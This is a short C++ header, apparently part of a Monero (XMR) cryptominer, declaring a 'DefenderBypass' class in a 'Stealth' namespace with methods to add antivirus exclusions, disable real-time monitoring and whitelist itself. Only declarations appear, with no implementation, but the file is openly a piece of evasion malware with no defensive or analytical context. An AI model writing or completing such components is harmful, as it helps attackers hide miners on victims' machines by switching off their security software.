#ifndef XMR_DEFENDER_BYPASS_H
#define XMR_DEFENDER_BYPASS_H

#include <string>
#include <atomic>
#include <cstdint>
#include <memory>
#include <mutex>
#include <thread>
#include <vector>
#include <functional>
#include <stdexcept>
#include <map>


    namespace Stealth {

  class DefenderBypass {
  public:
    bool add_exclusion(const std::string &path);
    bool disable_realtime_monitoring();
    bool add_to_whitelist();
  };

} // namespace Stealth

#endif
